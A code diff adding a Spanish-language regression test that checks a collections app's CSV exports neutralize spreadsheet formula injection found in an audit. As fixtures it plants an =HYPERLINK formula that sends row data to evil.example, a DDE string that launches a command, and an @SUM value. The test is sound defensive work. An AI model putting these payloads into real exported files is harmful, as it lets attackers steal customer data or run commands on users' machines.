@@ -330,6 +330,34 @@ def test_49_conciliacion_incluye_a_los_confirmados_por_asesor(entorno):
     assert "pendiente" in cuerpo
 
 
+def test_los_csv_de_cobranza_neutralizan_formulas(entorno):
+    """Auditoría 2026-09 (INJ-1): concepto, referencia de recibo y nombre del
+    cliente son texto libre que un colaborador (o el cliente, por su nombre)
+    controla, y los exportes de cobranza salían sin la comilla que /system ya
+    ponía. Un =HYPERLINK en Excel manda la fila (teléfono, nombre, monto) a
+    quien la puso."""
+    formula = '=HYPERLINK("https://evil.example/?d="&A2&B2,"Ver comprobante")'
+    with Session(entorno) as s:
+        s.add(Cobro(id=1, ticket_id=1, phone=PHONE, client_name="+cmd|' /C calc'!A0",
+                    concepto=formula, monto_centavos=80000,
+                    estado="pendiente", token_verificacion="tok-oxxo",
+                    creado_por=ASESOR, confirmado_por_asesor=True,
+                    confirmado_por=ASESOR, referencia_recibo="@SUM(1+1)"))
+        s.commit()
+
+    for ruta in ("/export/cobros.csv", "/export/conciliacion.csv"):
+        r = _cliente(ADMIN).get(ruta)
+        assert r.status_code == 200, ruta
+        cuerpo = r.text
+        # Cada celda peligrosa sale con la comilla inicial (csv la deja tal cual
+        # dentro de las comillas dobles del campo) y nunca "desnuda".
+        assert "\"'=HYPERLINK" in cuerpo, (ruta, cuerpo[:400])
+        assert ",=HYPERLINK" not in cuerpo and "\"=HYPERLINK" not in cuerpo, ruta
+        assert "'+cmd|" in cuerpo and ",+cmd|" not in cuerpo, ruta
+        if ruta.endswith("conciliacion.csv"):
+            assert "'@SUM(1+1)" in cuerpo and ",@SUM" not in cuerpo
+
+
 def test_un_cobro_oculto_no_sale_en_listados_totales_cartera_ni_csv(entorno):
     """Soft delete de cobros (habilitado=False), p. ej. los de prueba antes de
     arrancar. Si esto se pone rojo, los totales de producción siguen sumando
